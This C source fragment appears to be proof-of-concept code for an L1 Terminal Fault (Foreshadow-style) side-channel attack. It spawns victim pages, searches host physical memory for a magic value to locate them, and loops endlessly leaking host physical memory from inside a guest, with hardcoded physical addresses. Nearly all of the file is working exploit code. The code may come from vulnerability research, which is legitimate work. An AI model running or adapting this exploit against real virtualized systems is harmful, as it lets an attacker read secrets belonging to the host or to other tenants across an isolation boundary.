void _l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len);
void experiment_very_slow_leaking_addrs(hpa_t base)
{
	hpa_t pa = 0x102372030;
	// hpa_t pa = 0x279a42ff8;
	// hpa_t pa = 0x10236f490;
	u64 val = hc_read_pa(pa);
	dump(val);
	u64 leaked;
	while (1) {
		for (spectre_evict_amount = 0; spectre_evict_amount <= 1024;
			spectre_evict_amount = (spectre_evict_amount == 0 ? 1 : 2*spectre_evict_amount)) {
			for (int it = 0; it < 2; it++) {
				fprintf(stderr, "evamount =%5d  it =%5d", spectre_evict_amount, it); fflush(stdout); fprintf(stderr, CLEAR_LINE);
			_l1tf_leak((char *)&leaked, base, pa, 8);
			if (leaked)
				fprintf(stderr, "evamount =%5d  it =%5d  val = %16lx  leaked = %16lx\n", spectre_evict_amount, it, val, leaked);
			}
		}
	}
}

void find_victim_page(hpa_t base)
{
	void *vp = l1tf_spawn_leak_page();
	fprintf(stderr, "starting l1tf_find_page_pa(%p)...\n", vp);
	hpa_t pa = l1tf_find_page_pa(vp);
	fprintf(stderr, "victim page (va %p) at pa %lx\n", vp, pa);
	l1tf_test(vp, pa, 10000);
	for (int i = 0; i < 128; i++)
		*((char *)vp + i) = (char)i;
	fprintf(stderr, "victim page data:\n");
	display(vp, 128);
	// fprintf(stderr, "forever touching the first two cachelines of victim page now...\n");
	// while (1) {
	// 	*(volatile char *)vp;
	// 	*((volatile char *)vp + 64);
	// }
	fprintf(stderr, "forever idle spinning now...\n");
	while (1);
}

void refill_victim_page(hpa_t base)
{
	void *vp = l1tf_spawn_leak_page();
	for (int i = 0; i < 128/8; i++)
		*((u64 *)vp + i) = ((u64)rand() << 32) | rand();
	fprintf(stderr, "victim page data:\n");
	display(vp, 128);
	fprintf(stderr, "forever idle spinning now...\n");
	while (1);
}

hpa_t find_other_victim_page(hpa_t base)
{
	const int verbose = 1;
	fprintf(stderr, "find_other_victim_page(%lx)\n", base);

	  uint64_t t_start = clock_read();
	  u64 themagic = 0x6b8b4567327b23c6;
	  hpa_t pa = -1;

	  for (int run = 0; run < 100; run++) {
	      int off;
	      for (off = 0; off < 8; off += 2) {
		uint16_t magic = *(uint16_t *)((char *)&themagic + off);
		int iters = 1000 + off*100000;
		pa = l1tf_find_magic16(base, magic, 0, HOST_MEMORY_SIZE, 0x1000, iters);
		if (pa == -1UL)
		  break;
		if (verbose >= 1) fprintf(stderr, "l1tf_find_page_pa: run %3d  pa %12lx\n", run, pa);
	      }
	      if (off == 8) {
		if (verbose >= 1) {
		  double time = (clock_read()-t_start)/1000000000.0;
		  fprintf(stderr, "l1tf_find_page_pa: found pa %lx in %.1f sec\n", pa, time);
		}
		dump(pa);
		return pa;
	      }
	  }
	  dump(pa);
	  return pa;
}

void leak_other_victim_page(hpa_t base)
{
	hpa_t pa_vic = 0x3ff3e41000;
	while (1) {
		char buf[128];
		leak(buf, base, pa_vic, sizeof(buf));
		display(buf, sizeof(buf));
	}
}
